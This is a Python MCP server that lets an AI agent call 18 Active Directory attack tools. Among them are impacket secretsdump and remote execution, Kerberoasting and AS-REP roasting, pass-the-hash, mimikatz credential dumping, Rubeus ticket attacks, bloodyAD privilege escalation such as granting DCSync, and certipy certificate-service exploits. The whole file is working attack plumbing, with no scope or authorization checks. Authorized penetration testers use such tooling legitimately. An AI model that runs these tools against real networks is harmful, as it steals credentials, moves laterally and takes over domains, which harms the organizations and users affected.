#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
    LEVIATHAN VS - MCP Active Directory Security Server v1.0.0

    Active Directory enumeration, exploitation & lateral movement.
    Integrates: bloodhound, impacket, mimikatz, rubeus, netexec/crackmapexec,
                evil-winrm, bloodyAD, certipy, sharphound, enum4linux-ng.
    JSON-RPC 2.0 over stdio with Content-Length framing.

    Tools (18):
        - bloodhound_collect: BloodHound data collection (SharpHound/bloodhound-python)
        - bloodhound_analyze: Import & query BloodHound data
        - impacket_secretsdump: Dump SAM/NTDS/LSA secrets remotely
        - impacket_psexec: Remote command execution via PsExec-style
        - impacket_smbexec: Remote command execution via SMB
        - impacket_wmiexec: Remote command execution via WMI
        - impacket_getTGT: Request TGT ticket (Kerberos)
        - impacket_getST: Request service ticket (Kerberos)
        - impacket_getNPUsers: AS-REP Roasting (find accounts w/o preauth)
        - impacket_getuserspns: Kerberoasting (extract service ticket hashes)
        - netexec_smb: SMB enumeration & attacks (netexec/crackmapexec)
        - netexec_ldap: LDAP enumeration & attacks
        - netexec_winrm: WinRM enumeration & attacks
        - evilwinrm_shell: Evil-WinRM shell for Windows Remote Management
        - mimikatz_exec: Execute Mimikatz commands (credential extraction)
        - rubeus_kerberos: Kerberos attacks (roasting, delegation, tickets)
        - bloodyad_exploit: Active Directory privilege escalation (bloodyAD)
        - certipy_adcs: AD Certificate Services attacks (ESC1-ESC8)

    Author: ThiagoFrag / LEVIATHAN VS
    Version: 1.0.0
================================================================================
"""

import asyncio
import json
import logging
import os
import shutil
import subprocess
import sys
from typing import Any, Dict, List, Optional

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stderr)],
)
logger = logging.getLogger("leviathan-ad-mcp")

VERSION = "1.0.0"
SERVER_NAME = "leviathan-activedirectory-server"


def _find_tool(name: str) -> str:
    p = shutil.which(name)
    return p if p else name


def _run_tool(cmd: List[str], timeout: int = 600) -> Dict:
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
            encoding="utf-8", errors="replace",
        )
        return {
            "success": proc.returncode == 0,
            "stdout": proc.stdout.strip()[:50000],
            "stderr": proc.stderr.strip()[:5000],
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "error": f"Timeout after {timeout}s"}
    except FileNotFoundError:
        return {"success": False, "error": f"Tool not found: {cmd[0]}. Install it first."}
    except Exception as e:
        return {"success": False, "error": str(e)}


TOOLS = [
    {
        "name": "bloodhound_collect",
        "description": "Collect Active Directory data for BloodHound analysis (bloodhound-python/SharpHound)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Target AD domain (e.g. corp.local)"},
                "username": {"type": "string", "description": "Domain username"},
                "password": {"type": "string", "description": "Domain password"},
                "dc_ip": {"type": "string", "description": "Domain Controller IP"},
                "collection_method": {"type": "string", "description": "Collection method: All, DCOnly, Group, Session, etc."},
                "ns": {"type": "string", "description": "Nameserver IP override"},
            },
            "required": ["domain", "username", "password"],
        },
    },
    {
        "name": "bloodhound_analyze",
        "description": "Import BloodHound ZIP data and run analysis queries",
        "inputSchema": {
            "type": "object",
            "properties": {
                "zip_file": {"type": "string", "description": "Path to BloodHound ZIP data file"},
                "query": {"type": "string", "description": "Cypher query to run against neo4j"},
                "neo4j_url": {"type": "string", "description": "Neo4j bolt URL (default: bolt://localhost:7687)"},
            },
            "required": ["zip_file"],
        },
    },
    {
        "name": "impacket_secretsdump",
        "description": "Dump SAM, NTDS.dit, LSA secrets remotely (impacket-secretsdump)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target in format domain/user:password@ip"},
                "dc_ip": {"type": "string", "description": "Domain Controller IP"},
                "just_dc": {"type": "boolean", "description": "Only NTDS.dit (DRSUAPI)"},
                "just_dc_ntlm": {"type": "boolean", "description": "Only NTLM hashes from NTDS.dit"},
                "output_file": {"type": "string", "description": "Output file path"},
                "hashes": {"type": "string", "description": "NTLM hash for pass-the-hash (LM:NT)"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "impacket_psexec",
        "description": "Remote command execution via PsExec-like technique (impacket-psexec)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "domain/user:password@ip or domain/user@ip"},
                "command": {"type": "string", "description": "Command to execute on remote host"},
                "hashes": {"type": "string", "description": "NTLM hash for PTH (LM:NT)"},
                "codec": {"type": "string", "description": "Output codec (default: utf-8)"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "impacket_smbexec",
        "description": "Remote command execution via SMB (impacket-smbexec)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "domain/user:password@ip"},
                "command": {"type": "string", "description": "Command to execute"},
                "hashes": {"type": "string", "description": "NTLM hash for PTH"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "impacket_wmiexec",
        "description": "Remote command execution via WMI (impacket-wmiexec)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "domain/user:password@ip"},
                "command": {"type": "string", "description": "Command to execute"},
                "hashes": {"type": "string", "description": "NTLM hash for PTH"},
                "nooutput": {"type": "boolean", "description": "Don't wait for command output"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "impacket_getTGT",
        "description": "Request a Kerberos TGT ticket (impacket-getTGT)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "domain/user:password"},
                "dc_ip": {"type": "string", "description": "Domain Controller IP"},
                "hashes": {"type": "string", "description": "NTLM hash for PTH"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "impacket_getST",
        "description": "Request a Kerberos service ticket (impacket-getST)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "domain/user:password"},
                "spn": {"type": "string", "description": "Target SPN (e.g. cifs/server.domain.local)"},
                "dc_ip": {"type": "string", "description": "Domain Controller IP"},
                "impersonate": {"type": "string", "description": "User to impersonate (S4U2Self/S4U2Proxy)"},
            },
            "required": ["target", "spn"],
        },
    },
    {
        "name": "impacket_getNPUsers",
        "description": "AS-REP Roasting - find accounts without Kerberos pre-authentication",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "domain/ or domain/user"},
                "dc_ip": {"type": "string", "description": "Domain Controller IP"},
                "usersfile": {"type": "string", "description": "File with list of usernames to test"},
                "no_pass": {"type": "boolean", "description": "Don't supply password (enumerate mode)"},
                "format": {"type": "string", "description": "Output format: hashcat or john"},
                "output_file": {"type": "string", "description": "Output file for hashes"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "impacket_getuserspns",
        "description": "Kerberoasting - extract service ticket hashes for offline cracking",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "domain/user:password"},
                "dc_ip": {"type": "string", "description": "Domain Controller IP"},
                "request": {"type": "boolean", "description": "Request TGS tickets"},
                "output_file": {"type": "string", "description": "Output file for hashes"},
                "format": {"type": "string", "description": "Output format: hashcat or john"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "netexec_smb",
        "description": "SMB enumeration and attacks via NetExec (CrackMapExec successor)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP/range/CIDR"},
                "username": {"type": "string", "description": "Username"},
                "password": {"type": "string", "description": "Password"},
                "hashes": {"type": "string", "description": "NTLM hash for PTH"},
                "shares": {"type": "boolean", "description": "Enumerate shares"},
                "sessions": {"type": "boolean", "description": "Enumerate sessions"},
                "users": {"type": "boolean", "description": "Enumerate users"},
                "sam": {"type": "boolean", "description": "Dump SAM hashes"},
                "lsa": {"type": "boolean", "description": "Dump LSA secrets"},
                "exec_method": {"type": "string", "description": "Exec method: smbexec, atexec, wmiexec"},
                "command": {"type": "string", "description": "Command to execute via -x"},
                "extra_args": {"type": "string", "description": "Additional netexec arguments"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "netexec_ldap",
        "description": "LDAP enumeration and attacks via NetExec",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target Domain Controller IP"},
                "username": {"type": "string", "description": "Username"},
                "password": {"type": "string", "description": "Password"},
                "kerberoasting": {"type": "boolean", "description": "Kerberoasting via LDAP"},
                "asreproast": {"type": "boolean", "description": "AS-REP Roasting via LDAP"},
                "users": {"type": "boolean", "description": "Enumerate domain users"},
                "groups": {"type": "boolean", "description": "Enumerate domain groups"},
                "gmsa": {"type": "boolean", "description": "Dump gMSA passwords"},
                "extra_args": {"type": "string", "description": "Additional arguments"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "netexec_winrm",
        "description": "WinRM enumeration and attacks via NetExec",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP/range"},
                "username": {"type": "string", "description": "Username"},
                "password": {"type": "string", "description": "Password"},
                "hashes": {"type": "string", "description": "NTLM hash"},
                "command": {"type": "string", "description": "Command to execute via -x"},
                "ps_command": {"type": "string", "description": "PowerShell command via -X"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "evilwinrm_shell",
        "description": "Evil-WinRM shell for Windows Remote Management exploitation",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP/hostname"},
                "username": {"type": "string", "description": "Username"},
                "password": {"type": "string", "description": "Password"},
                "hash": {"type": "string", "description": "NTLM hash for PTH"},
                "command": {"type": "string", "description": "Command to execute (non-interactive)"},
                "scripts_path": {"type": "string", "description": "Path to PowerShell scripts to load"},
                "ssl": {"type": "boolean", "description": "Use SSL/TLS (port 5986)"},
            },
            "required": ["target", "username"],
        },
    },
    {
        "name": "mimikatz_exec",
        "description": "Execute Mimikatz commands for credential extraction (Windows only)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Mimikatz command (e.g. sekurlsa::logonpasswords)"},
                "module": {"type": "string", "description": "Mimikatz module to load"},
                "extra_args": {"type": "string", "description": "Additional arguments"},
            },
            "required": ["command"],
        },
    },
    {
        "name": "rubeus_kerberos",
        "description": "Rubeus - Kerberos attacks (roasting, delegation, ticket ops, S4U)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "action": {"type": "string", "description": "Action: kerberoast, asreproast, s4u, tgtdeleg, monitor, harvest, describe, ptt, renew, triage, dump"},
                "target_user": {"type": "string", "description": "Target user for the attack"},
                "domain": {"type": "string", "description": "Target domain"},
                "dc": {"type": "string", "description": "Domain controller IP/hostname"},
                "ticket": {"type": "string", "description": "Base64 ticket for operations"},
                "format": {"type": "string", "description": "Output format: hashcat or john"},
                "extra_args": {"type": "string", "description": "Additional Rubeus arguments"},
            },
            "required": ["action"],
        },
    },
    {
        "name": "bloodyad_exploit",
        "description": "Active Directory privilege escalation via bloodyAD (DACL abuse, shadow creds, etc.)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Target AD domain"},
                "username": {"type": "string", "description": "Username"},
                "password": {"type": "string", "description": "Password"},
                "dc_ip": {"type": "string", "description": "Domain Controller IP"},
                "action": {"type": "string", "description": "Action: addUser, changePassword, addToGroup, setShadowCredentials, setGenericAll, setDCSync, etc."},
                "target": {"type": "string", "description": "Target object (user, group, computer)"},
                "value": {"type": "string", "description": "Value for the action (new password, group name, etc.)"},
            },
            "required": ["domain", "username", "password", "action"],
        },
    },
    {
        "name": "certipy_adcs",
        "description": "AD Certificate Services attacks - ESC1 through ESC8 (certipy)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "action": {"type": "string", "description": "Action: find, req, auth, shadow, account, ptt, forge, template, ca"},
                "target": {"type": "string", "description": "domain/user:password@dc-ip"},
                "ca": {"type": "string", "description": "Certificate Authority name"},
                "template": {"type": "string", "description": "Certificate template name"},
                "upn": {"type": "string", "description": "User Principal Name to request cert for"},
                "pfx": {"type": "string", "description": "Path to PFX certificate file"},
                "vulnerable": {"type": "boolean", "description": "Show only vulnerable templates (with find)"},
                "extra_args": {"type": "string", "description": "Additional certipy arguments"},
            },
            "required": ["action"],
        },
    },
]


async def dispatch_tool(name: str, args: Dict) -> str:
    if name == "bloodhound_collect":
        cmd = [_find_tool("bloodhound-python"), "-d", args["domain"], "-u", args["username"], "-p", args["password"]]
        if args.get("dc_ip"):
            cmd.extend(["--dc-ip", args["dc_ip"]])
        if args.get("collection_method"):
            cmd.extend(["-c", args["collection_method"]])
        else:
            cmd.extend(["-c", "All"])
        if args.get("ns"):
            cmd.extend(["--ns", args["ns"]])
        cmd.append("--zip")
        r = _run_tool(cmd, timeout=600)
        return json.dumps(r, indent=2)

    elif name == "bloodhound_analyze":
        # Uses neo4j cypher-shell for queries
        neo4j_url = args.get("neo4j_url", "bolt://localhost:7687")
        if args.get("query"):
            cmd = [_find_tool("cypher-shell"), "-a", neo4j_url, args["query"]]
            r = _run_tool(cmd, timeout=120)
        else:
            r = {"success": True, "message": f"Import {args['zip_file']} into BloodHound GUI/CE for analysis"}
        return json.dumps(r, indent=2)

    elif name == "impacket_secretsdump":
        cmd = [_find_tool("impacket-secretsdump"), args["target"]]
        if args.get("dc_ip"):
            cmd.extend(["-dc-ip", args["dc_ip"]])
        if args.get("just_dc"):
            cmd.append("-just-dc")
        if args.get("just_dc_ntlm"):
            cmd.append("-just-dc-ntlm")
        if args.get("output_file"):
            cmd.extend(["-outputfile", args["output_file"]])
        if args.get("hashes"):
            cmd.extend(["-hashes", args["hashes"]])
        r = _run_tool(cmd, timeout=600)
        return json.dumps(r, indent=2)

    elif name == "impacket_psexec":
        cmd = [_find_tool("impacket-psexec"), args["target"]]
        if args.get("command"):
            cmd.extend(["-c", args["command"]])
        if args.get("hashes"):
            cmd.extend(["-hashes", args["hashes"]])
        r = _run_tool(cmd, timeout=300)
        return json.dumps(r, indent=2)

    elif name == "impacket_smbexec":
        cmd = [_find_tool("impacket-smbexec"), args["target"]]
        if args.get("command"):
            cmd.extend([args["command"]])
        if args.get("hashes"):
            cmd.extend(["-hashes", args["hashes"]])
        r = _run_tool(cmd, timeout=300)
        return json.dumps(r, indent=2)

    elif name == "impacket_wmiexec":
        cmd = [_find_tool("impacket-wmiexec"), args["target"]]
        if args.get("command"):
            cmd.append(args["command"])
        if args.get("hashes"):
            cmd.extend(["-hashes", args["hashes"]])
        if args.get("nooutput"):
            cmd.append("-nooutput")
        r = _run_tool(cmd, timeout=300)
        return json.dumps(r, indent=2)

    elif name == "impacket_getTGT":
        cmd = [_find_tool("impacket-getTGT"), args["target"]]
        if args.get("dc_ip"):
            cmd.extend(["-dc-ip", args["dc_ip"]])
        if args.get("hashes"):
            cmd.extend(["-hashes", args["hashes"]])
        r = _run_tool(cmd, timeout=120)
        return json.dumps(r, indent=2)

    elif name == "impacket_getST":
        cmd = [_find_tool("impacket-getST"), args["target"], "-spn", args["spn"]]
        if args.get("dc_ip"):
            cmd.extend(["-dc-ip", args["dc_ip"]])
        if args.get("impersonate"):
            cmd.extend(["-impersonate", args["impersonate"]])
        r = _run_tool(cmd, timeout=120)
        return json.dumps(r, indent=2)

    elif name == "impacket_getNPUsers":
        cmd = [_find_tool("impacket-GetNPUsers"), args["target"]]
        if args.get("dc_ip"):
            cmd.extend(["-dc-ip", args["dc_ip"]])
        if args.get("usersfile"):
            cmd.extend(["-usersfile", args["usersfile"]])
        if args.get("no_pass"):
            cmd.append("-no-pass")
        if args.get("format"):
            cmd.extend(["-format", args["format"]])
        if args.get("output_file"):
            cmd.extend(["-outputfile", args["output_file"]])
        r = _run_tool(cmd, timeout=300)
        return json.dumps(r, indent=2)

    elif name == "impacket_getuserspns":
        cmd = [_find_tool("impacket-GetUserSPNs"), args["target"]]
        if args.get("dc_ip"):
            cmd.extend(["-dc-ip", args["dc_ip"]])
        if args.get("request"):
            cmd.append("-request")
        if args.get("output_file"):
            cmd.extend(["-outputfile", args["output_file"]])
        if args.get("format"):
            cmd.extend(["-format", args["format"]])
        r = _run_tool(cmd, timeout=300)
        return json.dumps(r, indent=2)

    elif name == "netexec_smb":
        cmd = [_find_tool("netexec"), "smb", args["target"]]
        if args.get("username"):
            cmd.extend(["-u", args["username"]])
        if args.get("password"):
            cmd.extend(["-p", args["password"]])
        if args.get("hashes"):
            cmd.extend(["-H", args["hashes"]])
        if args.get("shares"):
            cmd.append("--shares")
        if args.get("sessions"):
            cmd.append("--sessions")
        if args.get("users"):
            cmd.append("--users")
        if args.get("sam"):
            cmd.append("--sam")
        if args.get("lsa"):
            cmd.append("--lsa")
        if args.get("exec_method"):
            cmd.extend(["--exec-method", args["exec_method"]])
        if args.get("command"):
            cmd.extend(["-x", args["command"]])
        if args.get("extra_args"):
            cmd.extend(args["extra_args"].split())
        r = _run_tool(cmd, timeout=300)
        return json.dumps(r, indent=2)

    elif name == "netexec_ldap":
        cmd = [_find_tool("netexec"), "ldap", args["target"]]
        if args.get("username"):
            cmd.extend(["-u", args["username"]])
        if args.get("password"):
            cmd.extend(["-p", args["password"]])
        if args.get("kerberoasting"):
            cmd.append("--kerberoasting")
        if args.get("asreproast"):
            cmd.append("--asreproast")
        if args.get("users"):
            cmd.append("--users")
        if args.get("groups"):
            cmd.append("--groups")
        if args.get("gmsa"):
            cmd.append("--gmsa")
        if args.get("extra_args"):
            cmd.extend(args["extra_args"].split())
        r = _run_tool(cmd, timeout=300)
        return json.dumps(r, indent=2)

    elif name == "netexec_winrm":
        cmd = [_find_tool("netexec"), "winrm", args["target"]]
        if args.get("username"):
            cmd.extend(["-u", args["username"]])
        if args.get("password"):
            cmd.extend(["-p", args["password"]])
        if args.get("hashes"):
            cmd.extend(["-H", args["hashes"]])
        if args.get("command"):
            cmd.extend(["-x", args["command"]])
        if args.get("ps_command"):
            cmd.extend(["-X", args["ps_command"]])
        r = _run_tool(cmd, timeout=300)
        return json.dumps(r, indent=2)

    elif name == "evilwinrm_shell":
        cmd = [_find_tool("evil-winrm"), "-i", args["target"], "-u", args["username"]]
        if args.get("password"):
            cmd.extend(["-p", args["password"]])
        if args.get("hash"):
            cmd.extend(["-H", args["hash"]])
        if args.get("ssl"):
            cmd.append("-S")
        if args.get("scripts_path"):
            cmd.extend(["-s", args["scripts_path"]])
        if args.get("command"):
            cmd.extend(["-c", args["command"]])
        r = _run_tool(cmd, timeout=300)
        return json.dumps(r, indent=2)

    elif name == "mimikatz_exec":
        cmd = [_find_tool("mimikatz")]
        full_cmd = args["command"]
        if args.get("module"):
            full_cmd = f"{args['module']}::{full_cmd}"
        cmd.extend([full_cmd, "exit"])
        r = _run_tool(cmd, timeout=120)
        return json.dumps(r, indent=2)

    elif name == "rubeus_kerberos":
        cmd = [_find_tool("rubeus"), args["action"]]
        if args.get("target_user"):
            cmd.extend([f"/user:{args['target_user']}"])
        if args.get("domain"):
            cmd.extend([f"/domain:{args['domain']}"])
        if args.get("dc"):
            cmd.extend([f"/dc:{args['dc']}"])
        if args.get("ticket"):
            cmd.extend([f"/ticket:{args['ticket']}"])
        if args.get("format"):
            cmd.extend([f"/format:{args['format']}"])
        if args.get("extra_args"):
            cmd.extend(args["extra_args"].split())
        r = _run_tool(cmd, timeout=300)
        return json.dumps(r, indent=2)

    elif name == "bloodyad_exploit":
        cmd = [_find_tool("bloodyAD"), "-d", args["domain"], "-u", args["username"], "-p", args["password"]]
        if args.get("dc_ip"):
            cmd.extend(["--dc-ip", args["dc_ip"]])
        cmd.append(args["action"])
        if args.get("target"):
            cmd.append(args["target"])
        if args.get("value"):
            cmd.append(args["value"])
        r = _run_tool(cmd, timeout=120)
        return json.dumps(r, indent=2)

    elif name == "certipy_adcs":
        cmd = [_find_tool("certipy"), args["action"]]
        if args.get("target"):
            cmd.append(args["target"])
        if args.get("ca"):
            cmd.extend(["-ca", args["ca"]])
        if args.get("template"):
            cmd.extend(["-template", args["template"]])
        if args.get("upn"):
            cmd.extend(["-upn", args["upn"]])
        if args.get("pfx"):
            cmd.extend(["-pfx", args["pfx"]])
        if args.get("vulnerable"):
            cmd.append("-vulnerable")
        if args.get("extra_args"):
            cmd.extend(args["extra_args"].split())
        r = _run_tool(cmd, timeout=300)
        return json.dumps(r, indent=2)

    return json.dumps({"error": f"Unknown tool: {name}"})


async def handle_message(msg: Dict) -> Optional[Dict]:
    method = msg.get("method", "")
    mid = msg.get("id")

    if method == "initialize":
        return {
            "jsonrpc": "2.0", "id": mid,
            "result": {
                "protocolVersion": "2024-11-05",
                "capabilities": {"tools": {"listChanged": False}},
                "serverInfo": {"name": SERVER_NAME, "version": VERSION},
            },
        }

    if method == "notifications/initialized":
        return None

    if method == "tools/list":
        return {"jsonrpc": "2.0", "id": mid, "result": {"tools": TOOLS}}

    if method == "tools/call":
        params = msg.get("params", {})
        tname = params.get("name", "")
        targs = params.get("arguments", {})
        try:
            result_text = await dispatch_tool(tname, targs)
        except Exception as exc:
            result_text = json.dumps({"error": str(exc)})
        return {
            "jsonrpc": "2.0", "id": mid,
            "result": {"content": [{"type": "text", "text": result_text}]},
        }

    if method == "ping":
        return {"jsonrpc": "2.0", "id": mid, "result": {}}

    return {
        "jsonrpc": "2.0", "id": mid,
        "error": {"code": -32601, "message": f"Method not found: {method}"},
    }


def _write_msg(data: Dict):
    body = json.dumps(data)
    frame = f"Content-Length: {len(body)}\r\n\r\n{body}"
    sys.stdout.buffer.write(frame.encode("utf-8"))
    sys.stdout.buffer.flush()


async def main_loop():
    if sys.platform == "win32":
        import msvcrt
        msvcrt.setmode(sys.stdin.fileno(), os.O_BINARY)
        msvcrt.setmode(sys.stdout.fileno(), os.O_BINARY)

    buf = b""
    logger.info(f"{SERVER_NAME} v{VERSION} started")

    while True:
        chunk = sys.stdin.buffer.read(1)
        if not chunk:
            break
        buf += chunk

        while b"\r\n\r\n" in buf:
            header, rest = buf.split(b"\r\n\r\n", 1)
            cl = 0
            for line in header.decode("utf-8", errors="replace").split("\r\n"):
                if line.lower().startswith("content-length:"):
                    cl = int(line.split(":", 1)[1].strip())
            if len(rest) < cl:
                buf = header + b"\r\n\r\n" + rest
                break
            body = rest[:cl]
            buf = rest[cl:]
            try:
                msg = json.loads(body)
            except json.JSONDecodeError:
                continue
            resp = await handle_message(msg)
            if resp:
                _write_msg(resp)


def main():
    asyncio.run(main_loop())


if __name__ == "__main__":
    main()
